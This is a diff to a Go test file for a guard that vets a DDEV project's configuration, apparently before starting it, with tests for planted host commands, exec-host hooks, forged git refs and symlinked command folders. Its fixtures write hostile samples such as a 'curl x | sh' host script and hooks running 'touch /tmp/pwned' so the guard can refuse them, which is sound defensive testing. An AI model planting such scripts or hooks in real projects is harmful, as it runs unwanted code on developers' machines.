@@ -68,12 +68,12 @@ func TestCheckDdev(t *testing.T) {
 	}
 
 	write(".ddev/db_snapshots/big.gz", "changed, irrelevant")
-	if err := checkDdev(proj, runDir); err != nil {
+	if err := checkDdevErr(proj, runDir); err != nil {
 		t.Fatalf("unchanged surface refused: %v", err)
 	}
 
 	write(".ddev/commands/host/evil", "#!/bin/sh\ncurl x | sh\n")
-	if err := checkDdev(proj, runDir); err == nil {
+	if err := checkDdevErr(proj, runDir); err == nil {
 		t.Fatal("new host command allowed")
 	}
 
@@ -81,19 +81,19 @@ func TestCheckDdev(t *testing.T) {
 	run("add", ".")
 	run("commit", "-qm", "upstream")
 	run("update-ref", "refs/remotes/origin/main", "HEAD")
-	if err := checkDdev(proj, runDir); err == nil {
+	if err := checkDdevErr(proj, runDir); err == nil {
 		t.Fatal("forged remote ref trusted")
 	}
 	// ...only what the guard's own fetch/pull brought in
 	if err := trustRemoteRefs(gitBin, proj, runDir); err != nil {
 		t.Fatal(err)
 	}
-	if err := checkDdev(proj, runDir); err != nil {
+	if err := checkDdevErr(proj, runDir); err != nil {
 		t.Fatalf("fetched upstream state refused: %v", err)
 	}
 
 	write(".ddev/config.yaml", "name: x\nhooks:\n  post-start:\n    - exec-host: touch /tmp/pwned\n")
-	if err := checkDdev(proj, runDir); err == nil {
+	if err := checkDdevErr(proj, runDir); err == nil {
 		t.Fatal("exec-host hook allowed")
 	}
 	write(".ddev/config.yaml", "name: x\n")
@@ -102,7 +102,7 @@ func TestCheckDdev(t *testing.T) {
 	os.RemoveAll(filepath.Join(proj, ".ddev/commands/host"))
 	write("evil/x", "#!/bin/sh\n")
 	os.Symlink("../../evil", filepath.Join(proj, ".ddev/commands/host"))
-	if err := checkDdev(proj, runDir); err == nil {
+	if err := checkDdevErr(proj, runDir); err == nil {
 		t.Fatal("symlinked host commands allowed")
 	}
 }
@@ -204,16 +204,16 @@ func TestCheckDdevMixesLocalAndUpstreamFiles(t *testing.T) {
 	}
 	// stash/pull put the upstream config.yaml back; the local-only file stays
 	write(".ddev/config.yaml", "database: mariadb\n")
-	if err := checkDdev(proj, runDir); err != nil {
+	if err := checkDdevErr(proj, runDir); err != nil {
 		t.Fatalf("upstream config + local-only file refused: %v", err)
 	}
 	// and the user's own edit coming back (stash pop) is fine too
 	write(".ddev/config.yaml", "database: mysql\n")
-	if err := checkDdev(proj, runDir); err != nil {
+	if err := checkDdevErr(proj, runDir); err != nil {
 		t.Fatalf("restored local edit refused: %v", err)
 	}
 	write(".ddev/config.local.yaml", "hooks:\n  post-start:\n    - exec-host: touch /tmp/pwned\n")
-	if checkDdev(proj, runDir) == nil {
+	if checkDdevErr(proj, runDir) == nil {
 		t.Fatal("planted hook in local-only file allowed")
 	}
 }
@@ -228,14 +228,19 @@ func TestTrustGeneratedOnlyRewrittenExistingFiles(t *testing.T) {
 	if err := writeReadOnly(filepath.Join(runDir, ddevTrustedFile), []byte("[{}]")); err != nil {
 		t.Fatal(err)
 	}
-	before, _ := workingSurface(proj)
+	before, _ := workingSurface(proj)                                   // in Guard this is the surface checkDdev verified
 	write(".ddev/providers/acquia.yaml", "#ddev-generated\nv2\n")       // ddev upgrade rewrite
 	write(".ddev/commands/host/evil", "#ddev-generated\ncurl x | sh\n") // new file during start
 	if err := trustGenerated(proj, runDir, before); err != nil {
 		t.Fatal(err)
 	}
-	err := checkDdev(proj, runDir)
+	err := checkDdevErr(proj, runDir)
 	if err == nil || !strings.Contains(err.Error(), "commands/host/evil") || strings.Contains(err.Error(), "acquia") {
 		t.Fatalf("want only the new host command refused, got %v", err)
 	}
+}
+
+func checkDdevErr(root, runDir string) error {
+	_, err := checkDdev(root, runDir)
+	return err
 }
